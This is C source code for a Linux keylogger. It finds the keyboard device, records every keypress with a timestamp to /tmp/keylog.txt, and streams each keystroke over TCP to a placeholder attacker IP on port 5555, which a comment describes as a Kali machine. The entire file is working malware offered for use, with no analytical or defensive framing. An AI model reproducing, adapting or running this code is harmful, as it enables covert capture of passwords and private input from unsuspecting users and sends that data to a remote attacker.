#include <stdio.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <string.h>
#include <time.h>
#include <dirent.h>
#include <stdlib.h>
#include <errno.h>

const char *keys[KEY_MAX + 1] = { NULL };

void init_keys() {
    // Minimal keymap + arrows
    keys[1] = "ESC"; keys[2] = "1"; keys[3] = "2"; keys[4] = "3"; keys[5] = "4"; 
    keys[6] = "5"; keys[7] = "6"; keys[8] = "7"; keys[9] = "8"; keys[10] = "9"; 
    keys[11] = "0"; keys[12] = "-"; keys[13] = "="; keys[14] = "Backspace"; keys[15] = "Tab";
    keys[16] = "q"; keys[17] = "w"; keys[18] = "e"; keys[19] = "r"; keys[20] = "t"; 
    keys[21] = "y"; keys[22] = "u"; keys[23] = "i"; keys[24] = "o"; keys[25] = "p"; 
    keys[26] = "["; keys[27] = "]"; keys[28] = "Enter"; keys[29] = "Ctrl";
    keys[30] = "a"; keys[31] = "s"; keys[32] = "d"; keys[33] = "f"; keys[34] = "g"; 
    keys[35] = "h"; keys[36] = "j"; keys[37] = "k"; keys[38] = "l"; keys[39] = ";"; 
    keys[40] = "'"; keys[41] = "`"; keys[42] = "Shift"; keys[43] = "\\"; keys[44] = "z";
    keys[45] = "x"; keys[46] = "c"; keys[47] = "v"; keys[48] = "b"; keys[49] = "n"; 
    keys[50] = "m"; keys[51] = ","; keys[52] = "."; keys[53] = "/"; keys[54] = "Shift";
    keys[57] = "Space"; keys[58] = "CapsLock";
    keys[59] = "F1"; keys[60] = "F2"; keys[61] = "F3"; keys[62] = "F4"; keys[63] = "F5";
    keys[64] = "F6"; keys[65] = "F7"; keys[66] = "F8"; keys[67] = "F9"; keys[68] = "F10";
    keys[87] = "F11"; keys[88] = "F12";
    keys[103] = "ArrowUp"; keys[105] = "ArrowLeft"; 
    keys[106] = "ArrowRight"; keys[108] = "ArrowDown";
}

// Auto-detect the first keyboard device
int detect_keyboard_device(char *device_path) {
    FILE *fp = fopen("/proc/bus/input/devices", "r");
    if (!fp) return -1;

    char line[256], event[32];
    int found = 0;
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, "keyboard")) { // likely keyboard device
            while (fgets(line, sizeof(line), fp)) {
                if (strstr(line, "Handlers=")) {
                    char *ev = strstr(line, "event");
                    if (ev) {
                        sscanf(ev, "event%31s", event);
                        snprintf(device_path, 64, "/dev/input/event%s", event);
                        found = 1;
                        break;
                    }
                }
            }
            break;
        }
    }
    fclose(fp);
    return found ? 0 : -1;
}

int main() {
    init_keys();

    char device[64];
    if (detect_keyboard_device(device) != 0) {
        fprintf(stderr, "Failed to auto-detect keyboard device.\n");
        return 1;
    }

    int fd = open(device, O_RDONLY);
    if (fd == -1) { perror("Cannot open input device"); return 1; }

    FILE *log = fopen("/tmp/keylog.txt", "a");
    if (!log) { perror("Cannot open log file"); return 1; }

    // Setup TCP connection to Kali
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) { perror("Socket creation failed"); sock = -1; }
    else {
        struct sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(5555);                // Attacker's listening port
        server.sin_addr.s_addr = inet_addr("ATTACKER_IP_ADDRESS"); // Attacker's IP
        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
            perror("Connect failed");
            sock = -1;
        }
    }

    struct input_event ev;
    while (1) {
        if (read(fd, &ev, sizeof(ev)) < (ssize_t)sizeof(ev)) continue;

        if (ev.type == EV_KEY && ev.value == 1) {
            char timestamp[32], buffer[128];
            time_t now = time(NULL);
            strftime(timestamp, sizeof(timestamp), "[%Y-%m-%d %H:%M:%S]", localtime(&now));

            if (ev.code <= KEY_MAX && keys[ev.code]) {
                snprintf(buffer, sizeof(buffer), "%s %s\n", timestamp, keys[ev.code]);
            } else {
                snprintf(buffer, sizeof(buffer), "%s [KEY:%d]\n", timestamp, ev.code);
            }

            fprintf(log, "%s", buffer);
            fflush(log);

            if (sock != -1) send(sock, buffer, strlen(buffer), 0);
        }
    }

    if (sock != -1) close(sock);
    fclose(log);
    close(fd);
    return 0;
}
